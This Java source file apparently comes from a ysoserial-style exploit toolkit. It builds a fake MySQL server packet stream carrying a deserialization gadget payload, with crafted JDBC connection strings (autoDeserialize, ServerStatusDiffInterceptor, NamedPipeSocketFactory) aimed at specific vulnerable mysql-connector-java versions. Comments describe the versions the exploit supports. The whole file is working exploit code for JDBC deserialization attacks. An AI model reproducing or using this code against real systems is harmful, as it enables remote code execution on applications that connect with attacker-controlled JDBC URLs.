package cn.butler.yso.utils;

import cn.butler.yso.utils.mysql.proto.GreetingMessage;
import cn.butler.yso.utils.mysql.proto.PacketHelper;
import com.sun.org.apache.xerces.internal.impl.dv.util.HexBin;
import cn.butler.yso.utils.mysql.proto.GadgetResolver;
import cn.butler.yso.utils.mysql.proto.VariablesResolver;
import java.io.ByteArrayOutputStream;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class FakeMySQLPcapFile {
    public String versionFlag = "";
    public String jdbc_url = "";

    public static Map<String, String> jdbc_urlMap = new HashMap<>();

    static {
        jdbc_urlMap.put("mysql5", "jdbc:mysql://ceshihost/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&socketFactory=com.mysql.jdbc.NamedPipeSocketFactory&namedPipePath={filePath}");
        jdbc_urlMap.put("mysql6", "jdbc:mysql://ceshihost/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&namedPipePath={filePath}");
        jdbc_urlMap.put("mysql8", "jdbc:mysql://ceshihost/test?&maxAllowedPacket=74996390&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&socketFactory=com.mysql.cj.protocol.NamedPipeSocketFactory&namedPipePath={filePath}");
    }

    public FakeMySQLPcapFile(String mysqlVersion) {
        // 根据版本号选择连接串
        if (mysqlVersion.startsWith("5.")) {
            jdbc_url = jdbc_urlMap.get("mysql5");
        } else if (mysqlVersion.startsWith("6.")) {
            jdbc_url = jdbc_urlMap.get("mysql6");
        } else if (mysqlVersion.startsWith("8.")) {
            jdbc_url = jdbc_urlMap.get("mysql8");
        } else {
            throw new IllegalArgumentException("工具不支持的 mysql-connector-java 漏洞利用版本: " + mysqlVersion);
        }
        // 比较版本范围
        if (isVersionInRange(mysqlVersion, "5.1.11", "5.1.18")) {
            versionFlag = "Version1"; //5.1.11-5.1.18(包含俩边界)
        } else if (isVersionInRange(mysqlVersion, "5.1.19", "5.1.28") || isVersionInRange(mysqlVersion, "5.1.29", "5.1.48") || isVersionInRange(mysqlVersion, "6.0.2", "6.0.6")) {
            versionFlag = "Version2"; //(5.1.19-5.1.28(包含俩边界)，(5.1.29-5.1.48(包含俩边界))，6.0.2-6.0.6(包含俩边界))
        } else if (isVersionInRange(mysqlVersion, "8.0.11", "8.0.19")){
            versionFlag = "Version3"; //(8.0.11-8.0.19(11可以,19可以,20不行)) 13突然不行
        }else {
            throw new IllegalArgumentException("工具不支持的 mysql-connector-java 漏洞利用版本: " + mysqlVersion);
        }
    }

    public byte[] makePcap(byte[] mysqlData)throws Exception{
        String mysqlUsername = "root"; //mysql连接时的用户名

        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        String a = null;
        //rsp_1 DriverManager.getConnection
        byte[] greet = new GreetingMessage().getBytes();
        byte[] finalPacket = PacketHelper.buildPacket(0, greet);
        outputStream.write(finalPacket);
        outputStream.flush();
        //rsq_2
        if (versionFlag.equals("Version1")) {
            a ="360000018fa20200ffffff00210000000000000000000000000000000000000000000000"+ HexBin.encode(mysqlUsername.getBytes())+"00007465737400";
        }else {
            a ="4E0000018FA20A00FFFFFF00210000000000000000000000000000000000000000000000"+ HexBin.encode(mysqlUsername.getBytes())+"000074657374006D7973716C5F6E61746976655F70617373776F726400";
        }

        outputStream.write(Objects.requireNonNull(HexBin.decode(a)));
        outputStream.flush();
        //rsp_2
        outputStream.write(Objects.requireNonNull(HexBin.decode("0700000200000002000000")));
        outputStream.flush();

        if (versionFlag.equals("Version3")) {
            outputStream.write(Objects.requireNonNull(HexBin.decode("65000000032f2a206d7973716c2d636f6e6e6563746f722d6a6176612d382e302e313420285265766973696f6e3a203336353334666132373362346437383234613836363863613638353436356366386561656164643929202a2f53484f57205641524941424c4553")));
            outputStream.flush();
            //rsq_3
            //mysql5

            VariablesResolver resolver = new VariablesResolver(outputStream);
            resolver.resolve();
            outputStream.write(Objects.requireNonNull(HexBin.decode("0f00000003534554204e414d45532075746638")));
            outputStream.flush();

            outputStream.write(Objects.requireNonNull(HexBin.decode("0700000200000002000000")));
            outputStream.flush();
        }

        outputStream.write(Objects.requireNonNull(HexBin.decode("140000000353484F572053455353494F4E20535441545553")));
        outputStream.flush();

        //rsp_3
        GadgetResolver gadgetResolver = new GadgetResolver(outputStream,mysqlData);
        gadgetResolver.resolve();
        outputStream.flush();
        return outputStream.toByteArray();
    }

    // 比较版本范围
    private boolean isVersionInRange(String version, String min, String max) {
        return compareVersion(version, min) >= 0 && compareVersion(version, max) <= 0;
    }

    // 版本比较函数
    private int compareVersion(String v1, String v2) {
        String[] arr1 = v1.split("\\.");
        String[] arr2 = v2.split("\\.");
        int len = Math.max(arr1.length, arr2.length);
        for (int i = 0; i < len; i++) {
            int num1 = i < arr1.length ? Integer.parseInt(arr1[i]) : 0;
            int num2 = i < arr2.length ? Integer.parseInt(arr2[i]) : 0;
            if (num1 != num2) {
                return num1 - num2;
            }
        }
        return 0;
    }
}
